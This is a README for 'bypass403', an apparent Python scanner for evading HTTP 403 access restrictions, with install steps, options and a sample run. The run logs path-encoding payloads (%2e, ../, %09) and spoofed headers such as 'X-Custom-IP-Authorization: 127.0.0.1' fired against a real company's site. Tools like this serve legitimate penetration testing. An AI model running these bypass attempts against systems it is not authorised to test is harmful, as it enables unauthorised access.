
# Asynchronous Scanner

---

## Description
###  Program to bypass 403 code
Based on [4-ZERO-3](https://github.com/Dheerajmadhukar/4-ZERO-3/tree/main)

---

## Install:
```pycon
git clone 
cd bypass403
```
```pycon
1. Create a virtual environment:
    python -m venv .venv

2. Activate the virtual environment:
    On Windows:
    .venv\Scripts\activate
    
    On macOS/Linux:
    source .venv/bin/activate

pip install -r requirements.txt
# pip freeze > requirements.txt
```

---

### Use:
```text
"-i", "--input", help="Path to the file with links for check"
"-o", "--output", help="Output folder", default="output_report"
"-p", "--payloads", help="Path to file with payloads"
"-c", "--concurrency", help="Number of concurrent requests per sec", default=10)
"-t", "--timeout", help="Request timeout", default=45 sec)
"-px", "--proxy", help="Proxy for intercepting requests (e.g., http://127.0.0.1:8080)"
```
```pycon
python bypass403.py -c 2 -px http://127.0.0.1:8080
```

### After scanning, check the **output_report** folder!

---

### Example

```bash
python bypass403.py -c 10

[*] Starting @ 16:31:18 2024-09-06
[*] Total number of payload variants per link: 18

[*] Total number of payload options per link including header: 810

[1] URL: http://www.anthropic.com/careers?_rsc=10d0v=/%%%%2e%%%%2e | Status: 200 | Response time: 0.36 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': '127.0.0.1'}
[2] URL: http://www.anthropic.com/careers?_rsc=10d0v=/%2e/ | Status: 200 | Response time: 0.36 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'X-HTTP-DestinationURL': 'http://127.0.0.1'}
[3] URL: http://www.anthropic.com/careers?_rsc=10d0v=/%%%%23%%%%3f | Status: 200 | Response time: 0.40 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'X-Originating-IP': '127.0.0.1'}


[808] URL: http://www.anthropic.com/careers?_rsc=10d0v=/../ | Status: 200 | Response time: 0.42 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Custom-IP-Authorization': '127.0.0.1'}
[809] URL: http://www.anthropic.com/careers?_rsc=10d0v=/%%%%2f | Status: 200 | Response time: 0.43 sec | Header: {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'X-Forwarded-Port': '8080'}
[810] URL: http://www.anthropic.com/careers?_rsc=10d0v=/%09 | Status: 200 | Response time: 1.41 sec | Header: {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'X-HTTP-DestinationURL': 'http://127.0.0.1'}


[*] Finished @ 16:32:40 2024-09-06
[*] Duration: 0:01:21.685637


```



---
